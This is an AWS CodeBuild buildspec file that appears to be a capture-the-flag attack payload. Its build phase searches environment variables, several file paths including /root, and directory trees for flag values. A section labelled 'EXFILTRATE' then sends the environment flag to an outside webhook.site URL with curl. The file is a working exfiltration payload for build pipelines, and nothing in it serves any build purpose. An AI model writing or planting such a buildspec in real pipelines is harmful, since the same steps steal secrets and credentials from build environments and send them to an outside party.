version: 0.2

phases:
  build:
    commands:
      - echo "=== ENV FLAG ==="
      - printenv | grep -iE '^FLAG=|_FLAG=|FLAG_' || true

      - echo "=== FLAG FILE ==="
      - |
        for f in /flag /flag.txt /tmp/flag /tmp/flag.txt /root/flag /root/flag.txt \
                 /workspace/flag /workspace/flag.txt; do
          if [ -f "$f" ]; then
            echo "FOUND $f"
            cat "$f"
          fi
        done

      - echo "=== TARGETED SEARCH ==="
      - grep -RniE 'flag\{[^}]+\}|HTB\{|HTB-' /tmp /workspace /root 2>/dev/null | head -20 || true

      - echo "=== EXFILTRATE ==="
      - |
        FLAG="$(printenv | grep -iE '^FLAG=' | head -1 | cut -d= -f2-)"
        if [ -n "$FLAG" ]; then
          curl -sS -X POST \
            "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" \
            --data-urlencode "flag=$FLAG"
        fi
